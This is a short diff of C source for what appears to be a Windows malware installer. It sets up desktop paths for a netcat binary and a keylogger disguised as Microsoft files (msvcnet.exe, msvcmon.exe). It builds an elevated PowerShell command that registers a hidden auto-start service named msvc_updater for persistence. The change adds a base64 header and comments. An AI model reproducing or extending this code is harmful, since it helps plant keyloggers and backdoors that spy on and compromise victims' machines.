@@ -5,6 +5,8 @@
 #include <wininet.h>
 #include <Shlobj.h>
 
+#include "src/base64.h" 
+
 
 #define PSHELL_PATH "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
 #define CHROME_PATH "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
@@ -55,13 +57,16 @@ int main(int argc, char* argv[])
 
 
     char nc_path[MAX_PATH];
+    // msvcnet.exe
     snprintf(nc_path, MAX_PATH, "%s\\msvcnet.exe", desktop_path);
 
     char kylg_path[MAX_PATH];
+    // msvcmon.exe
     snprintf(kylg_path, MAX_PATH, "%s\\msvcmon.exe", desktop_path);
 
     char ps_params[256];
     char msvcsv_path[MAX_PATH];
+    // msvc_updater.exe
     snprintf(msvcsv_path, MAX_PATH, "%s\\msvc_updater.exe", desktop_path);
     sprintf(ps_params, 
         "-Command \"Start-Process cmd.exe -ArgumentList '/c sc create msvc_updater binPath=\"%s\" start=auto && sc start msvc_updater' -Verb RunAs\"",
